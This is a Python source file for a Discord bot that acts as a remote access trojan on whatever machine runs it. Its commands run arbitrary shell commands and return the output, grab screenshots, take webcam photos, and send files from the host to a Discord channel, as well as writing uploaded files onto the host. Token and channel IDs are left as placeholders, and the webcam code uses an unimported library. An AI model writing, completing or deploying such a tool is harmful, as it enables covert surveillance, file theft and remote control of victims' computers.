import discord
from discord.ext import commands
import subprocess
import io
from PIL import ImageGrab
import os
import textwrap
import unicodedata

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')


@bot.command()
async def command(ctx, *args):
    message = ' '.join(args) if args else 'nada'
    result = subprocess.run(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode().replace('\r', '')
    partes = textwrap.wrap(output, width=2000, replace_whitespace=False)

    for X in partes:
        try:
            await ctx.send(X)
        except:
            await ctx.send(X)
@bot.command()
async def shot(ctx):
    # capture a imagem da tela
    imagem = ImageGrab.grab()

    # crie um buffer de bytes em memória para armazenar a imagem
    with io.BytesIO() as image_binary:
        # salve a imagem no buffer
        imagem.save(image_binary, 'PNG')
        image_binary.seek(0)

        # crie um objeto discord.File a partir do buffer
        file = discord.File(fp=image_binary, filename='print.png')

        # envie a imagem para o canal especificado
        canal = bot.get_channel('YOUR DESTINATION CHANNEL ID HERE') # substitua pelo ID do canal desejado
        await canal.send(file=file)
@bot.command()
async def upload(ctx):
    attachment = ctx.message.attachments[0] if ctx.message.attachments else None
    if attachment is None:
        await ctx.send('Você precisa enviar um arquivo.')
        return

    filename = attachment.filename
    with open(filename, 'wb') as f:
        await attachment.save(f)
    await ctx.send(f'O arquivo {filename} foi salvo com sucesso.')
@bot.command()
async def limpar(ctx):
    channel = ctx.channel
    await channel.purge()
    await ctx.send(f'Todas as mensagens em {channel.mention} foram apagadas.')

@bot.command()
async def download(ctx, *args):
    arquivo = ' '.join(args) if args else None
    canal = bot.get_channel('YOUR DESTINATION CHANNEL ID HERE')
    final = arquivo.replace('\\', '/')
    print(final)
    try:
        arquivo_norm = unicodedata.normalize('NFKD', arquivo).encode('ascii', 'ignore').decode()
        with open(os.path.normpath(arquivo_norm), 'rb') as f:
            file = discord.File(f)
            await canal.send(file=file)
    except:
        await canal.send('Erro ao enviar/Arquivo nao encontrado')
@bot.command()

async def webcam(ctx):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        filename = 'captura.jpg'
        cv2.imwrite(filename, frame)
        await bot.get_channel(CHANELL ID HERE).send(file=discord.File(filename))
        os.remove(filename)
    else:
        await bot.get_channel(CHANNEL ID HERE).send("Falha ao capturar a imagem da webcam.")

bot.run('YOUR BOT TOKEN HERE')
